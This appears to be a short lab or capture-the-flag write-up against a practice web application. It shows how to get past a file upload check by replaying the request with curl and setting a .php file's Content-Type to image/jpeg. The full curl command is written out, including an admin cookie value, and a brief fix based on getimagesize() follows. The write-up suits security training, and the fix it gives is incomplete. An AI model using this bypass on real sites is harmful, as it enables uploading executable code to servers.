from: http://10.11.200.245/?page=upload

Go to File Upload, then try to upload a php file. You will see an error telling that your image si not uploaded. Go to the console and select the network tab. You will see that a request named "?page=upload" has been sent. Copy this request as Curl and past it into your term, change the line Content-Type to "image/jpeg". It will fake the server telling it that your file is an image.

How to fix it:
The user have full access to the request so he can easily modify the content-type like we did.
A function like getimagesize() in PHP can secure it. If the return of the function is 0 , than the file is not a picture.

curl 'http://10.11.200.246/?page=upload' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Origin: http://10.11.200.246' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8,es;q=0.6,fr;q=0.4' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYxbZpeWfAT5pWloG' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://10.11.200.246/?page=upload' -H 'Connection: keep-alive' --data-binary $'------WebKitFormBoundaryYxbZpeWfAT5pWloG\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundaryYxbZpeWfAT5pWloG\r\nContent-Disposition: form-data; name="uploaded"; filename="test.php"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryYxbZpeWfAT5pWloG\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundaryYxbZpeWfAT5pWloG--\r\n' --compressed
